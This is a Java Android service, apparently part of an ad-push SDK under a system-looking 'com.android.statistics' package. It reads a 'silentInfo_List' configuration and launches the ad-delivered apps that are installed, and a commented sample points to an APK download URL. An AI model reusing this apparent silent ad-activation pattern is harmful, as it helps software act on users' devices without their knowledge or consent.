package com.android.statistics;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.android.statistics.utils.HelpUtil;
import com.android.statistics.utils.LogUtil;
import com.android.statistics.utils.PerfectUtil;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.PowerManager;
import android.util.Log;

public class OrderActivationService extends Service {
	private static final String TAG = "PlugOrderActivationService";
	String ad_id = null;
	String download_url = null;
	String app_size = null;
	String package_name = null;
	String app_id = null;
	String app_name = null;
	String resultString = "";

	@Override
	public IBinder onBind(Intent paramIntent) {
		return null;
	}


	@Override
	public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {

       
		String data = HelpUtil.readFileStream(
				getApplicationContext(), "plugActivation.txt");
//		data="{\"silentInfo_List\": [{\"ad_id\": \"sp20161117150835\",\"ad_type\": \"8\",\"plugAcvita_infos\": [{\"package_name\": \"com.android.viewstars\",\"is_activation\": \"y\",\"download_url\": \"http://gg.angelpush.com/advert/app/LazySwipe/176bb28d1a2532fce5f4ae949ca20836_20150528162132.apk\"}]}]}";
		if (LogUtil.flag)
			Log.v(TAG,
					"Perfect enter into the plugActivationService! data"
							+ data);
		if (data != null && !data.equals("")) {
			try {
				JSONObject jObject = new JSONObject(data);

				JSONArray jsonArray = jObject
						.getJSONArray("silentInfo_List");
				for (int i = 0; i < jsonArray.length(); i++) {

					JSONObject jsonObject = jsonArray
							.optJSONObject(i);
					String ad_id = jsonObject.getString("ad_id");
					if (LogUtil.flag)
						Log.v(TAG,
								"Perfect enter into the plugActivationService! ad_id="
										+ ad_id);
					String ad_type = jsonObject
							.getString("ad_type");
					if (LogUtil.flag)
						Log.v(TAG,
								"Perfect enter into the plugActivationService! ad_type="
										+ ad_type);
					JSONArray childJsonaArray = jsonObject
							.getJSONArray("plugAcvita_infos");
					for (int j = 0; j < childJsonaArray.length(); j++) {
						JSONObject childJson = childJsonaArray
								.optJSONObject(j);
						String is_activation = childJson
								.getString("is_activation");
						if (LogUtil.flag)
							Log.v(TAG,
									"Perfect enter into the plugActivationService! is_activation="
											+ is_activation);
						if (is_activation!=null&&is_activation.equalsIgnoreCase("y")) {
						
						String package_name = childJson
								.getString("package_name");
						if (LogUtil.flag)
							Log.v(TAG,
									"Perfect enter into the plugActivationService! package_name="
											+ package_name);

    					if (PerfectUtil.isInstalled(getApplicationContext(), package_name)) {
    					boolean ourSelfAPk = PerfectUtil.isIntentAvailable(getApplicationContext(),
    							package_name, PerfectUtil.selfAction);
    					if (LogUtil.flag)
    						Log.v(TAG, "Perfect ourSelfAPk123=" + ourSelfAPk);
    					if (ourSelfAPk){
    						int code=PerfectUtil.openOurApplicationEx(getApplicationContext(), package_name);
    						if (LogUtil.flag)
    							Log.v(TAG, "Perfect ourSelfAPk code=" + code);
    					}else{
    						PerfectUtil.openApplication(getApplicationContext(), package_name);
    					}
    					}
						}
					}
					stopSelf();
				}
			} catch (JSONException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		
		return START_NOT_STICKY;
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		if (LogUtil.flag)
			Log.v(TAG,
					"Perfect enter into the PlugOrderActivationService:onDestroy");
	}

	@SuppressWarnings("deprecation")
	@Override
	public void onStart(Intent intent, int startId) {
		if (LogUtil.flag)
			Log.v(TAG,
					"Perfect enter into the PlugOrderActivationService:onStart");
		super.onStart(intent, startId);
	}

	@Override
	public void onCreate() {
		super.onCreate();
		if (LogUtil.flag)
			Log.v(TAG,
					"Perfect enter into the PlugOrderActivationService:Oncreate!");
	}

}